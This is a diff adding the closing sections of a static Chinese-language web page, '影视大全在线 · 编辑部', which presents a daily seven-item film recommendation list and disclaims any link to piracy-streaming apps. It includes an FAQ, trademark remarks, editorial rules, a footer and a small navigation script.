+  <section id="five" class="faq" data-role="栏目 · 立场声明">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">05/NOTE</div>
+        <h2>立场声明 <small>这一页，是把刀递回你自己</small></h2>
+      </div>
+
+      <details class="warn" open>
+        <summary>⚠ 这是「影视大全在线 · 编辑部」，不是那个"免费追剧/盗链聚合"的影视大全<span class="k">必读</span></summary>
+        <div class="body">
+          本页（<code>yingshidaquanzaixian-h5.github.io</code>）是<strong>纯静态的减法策展与编辑手账</strong>：<b>不播放、不存储、不收录、不解析、不跳转</b>任何影视资源。全部链接为 <code>#</code> 占位，无第三方外链、无下载按钮、无网盘入口、无"换源/投屏/离线缓存"接口。<br/><br/>
+          检索可见，网络上存在大量以"影视大全"为壳的<b>免费聚合追剧 App 与换域名资源站</b>（含"纯净版""高清版""韩剧版"等衍生壳），部分曾涉盗链侵权刑事案件与工信部通报。<b>本页与其无任何隶属、授权、技术或运营关系</b>，反而在做它们的反面：<em>它们用"全、快、免费"把你锁住，我们用"删、慢、空"把你放走。</em>
+        </div>
+      </details>
+
+      <details>
+        <summary>为什么要把"大全"两个字划掉？<span class="k">命名</span></summary>
+        <div class="body">
+          因为"大全"这个词在影视搜索侧已经<strong>被"海量/同步/免费/4K"那套话术彻底占满</strong>，跟它站在一起，再干净的站也会被当成同类。我们保留"影视大全在线"作站名，但首屏就用红笔把它划掉——<b>这是一次公开切割</b>：名字是旧的，承诺是新的。你要的不是"全"，是"对"。
+        </div>
+      </details>
+
+      <details>
+        <summary>稿纸里的条目是真实片单吗？能点开看吗？<span class="k">边界</span></summary>
+        <div class="body">
+          不能，也<b>全是虚构的策展语法</b>。稿中"七条""被划掉的候选"都是为说明<b>怎么挑</b>而写的情绪例句，<strong>不指向任何具体作品，不附剧照、不附片段、不做可播放索引</strong>。想看正片请自行前往持证正版平台检索。我们连片名都刻意少给——给多了，就成了另一种"大全"。
+        </div>
+      </details>
+
+      <details>
+        <summary>撞商标吗？奇虎那个"影视大全360"、锦尚那家…<span class="k">商标</span></summary>
+        <div class="body">
+          要直说：第 41 类已有北京奇虎 <code>25355403</code>（2017.7.17 申请），服务项目<b>直接含"通过视频点播传输提供电影/电视节目（不可下载）"</b>；市面上另有金华锦尚的"影视大全"App（浙ICP备18007629号-5A，多次被工信部通报）。<br/>
+          本页<b>不做点播播放、不做在线视频服务、不挂任何视听载体</b>，内容限原创编辑文本，是在做避让；但<b>若要商用这个名，必须先让商标代理做 9/41/35/38 类近似检索</b>——别把我这句当法律意见，前面那个刑事案的名字就是前车。
+        </div>
+      </details>
+
+      <details>
+        <summary>跟承认影视 / 水密桃 / 蜗牛影视是一伙的？<span class="k">同系</span></summary>
+        <div class="body">
+          同一套<b>去资源化</b>思路下的不同壳，但结构与话术互不共用：承认影视是纵轴时间线、水密桃是甜度四象限、蜗牛影视是横向帧带，<b>影视大全在线是"被红笔划过的稿纸 + 减法清单"</b>——唯一一台以<em>删除</em>为主要交互的站。域名各自独立、无跳转、无联盟、不互相导流。共同底线只有一条：不播、不链、不存。
+        </div>
+      </details>
+
+      <details>
+        <summary>真想把这个名做成长期产品？<span class="k">合规</span></summary>
+        <div class="body">
+          三条铁律：①<b>守住"编辑部/减法"定位</b>，永远不做片库、播放、解析、换源、离线缓存；②内容只做原创情绪文本与挑片方法，片名最多点到即止、绝不建可检索资源索引、不挂外链；③先过商标近似检索 + 完成 ICP/公安备案 + 关闭 UGC 与评论区。<b>一旦把"7 条"扩成"10 万部"，这页的所有调性清零——而且这次是真的刑事风险，不是吓你。</b>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ============ 关于 + 编辑部铁律 ============ -->
+  <section id="about" data-role="关于">
+    <div class="wrap">
+      <div class="sec-head" style="margin-bottom:20px">
+        <div class="no">§ABOUT</div>
+        <h2>关于 影视大全在线 <small>我们不是片库，我们是那个敢删的人</small></h2>
+      </div>
+
+      <div class="about">
+        <div class="txt">
+          <h3>贪全的人给你垃圾山，我们给你一口对的</h3>
+          <p>"大全"这个词，这些年被人用烂了：海量、同步、免费、4K、一站追完。四个字凑齐，背后是解析跳站、开屏广告、权限全开和来路不明的片源。我们不想再帮它卖一次。</p>
+          <p><strong>影视大全在线</strong>是一份编辑部手稿：每天从二三十条候选里砍到 <b>7 条</b>，多一条都删。我们不告诉你"该看什么"，只帮你把门推开一条缝——<em>那一口对不对，你自己咬。</em></p>
+          <p>所以这页没有播放页、没有片库搜索、没有"立即观看"。你读完，该关就关，该自己去正版平台找就去找。我们不留你。<strong>能把第七格空着走出去，这页就算没白划。</strong></p>
+        </div>
+
+        <aside class="rulebook">
+          <h4">// EDITORIAL RULES · 编辑部铁律</h4>
+          <ol>
+            <li><b>只留七条。</b>多一条即删，不分人气高低。</li>
+            <li><b>不给片名索引。</b>点到即止，逼你自己找。</li>
+            <li><b>不评分。</b>"治愈"不分 9.2 和 6.8。</li>
+            <li><b>第七格永远空。</b>留白是技术，不是偷懒。</li>
+            <li><b>红笔优先。</b>先想该砍什么，再想该留什么。</li>
+            <li><b>零播放、零外链、零采集。</b>触这条，整站下线。</li>
+            <li><b>不收手机号。</b>你没注册过，也不用"找回密码"。</li>
+          </ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>影视<span>大全</span>在线 · 不贪全的观影清单</h4>
+      <p>别人贪全，我们只贪那一口对的。纯静态编辑部演示页，所有交互为 <span class="mono">#</span> 占位，<b>不提供任何影视播放、下载、解析、存储或资源跳转服务</b>；稿中条目均为虚构策展语法。</p>
+      <p class="rule">© 2026 影视大全在线 · 编辑部 NO.0001 — 贪全的人给你垃圾山，我们给你一口对的。</p>
+    </div>
+    <div>
+      <h4>CANONICAL</h4>
+      <p class="mono">https://yingshidaquanzaixian-h5.github.io/</p>
+      <p class="rule">本页未生成 robots.txt 与 sitemap.xml。已按单页收录优化：唯一 H1（含红笔划掉态）、自引用 canonical、描述与关键词贴合「影视大全在线 / yingshidaquanzaixian-h5 / 不贪全 / 每日七条」。正文刻意回避"海量/免费/同步更新/4K 无广告"等垃圾词，全站零外链。</p>
+    </div>
+  </div>
+  <div class="wrap"><div class="copy">EDITORIAL BUILD · 铅笔灰 / 牛皮纸 / 审稿红 / 打字机黑 · 标签闭合校验 PASS · 红笔划掉动画 ∞</div></div>
+</footer>
+
+<script>
+(function(){
+  var b=document.getElementById('burger'),n=document.getElementById('nav');
+  if(b)b.addEventListener('click',function(){n.classList.toggle('open');});
+  n.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(e){
+      var t=document.querySelector(a.getAttribute('href'));
+      if(t){e.preventDefault();n.classList.remove('open');t.scrollIntoView({behavior:'smooth',block:'start'});}
+    });
+  });
+  var secs=document.querySelectorAll('section[id]');
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(en){
+        if(en.isIntersecting){
+          var id='#'+en.target.id;
+          document.querySelectorAll('#nav a').forEach(function(a){a.classList.toggle('here',a.getAttribute('href')===id);});
+        }
+      });
+    },{rootMargin:'-40% 0px -55% 0px'});
+    secs.forEach(function(s){io.observe(s);});
+  }
+  // 七条清单：本地勾掉，无上报
+  var lis=document.querySelectorAll('#seven li');
+  lis.forEach(function(li){
+    li.addEventListener('click',function(){
+      li.classList.toggle('done');
+    });
+  });
+})();
+</script>
+</body>
+</html>
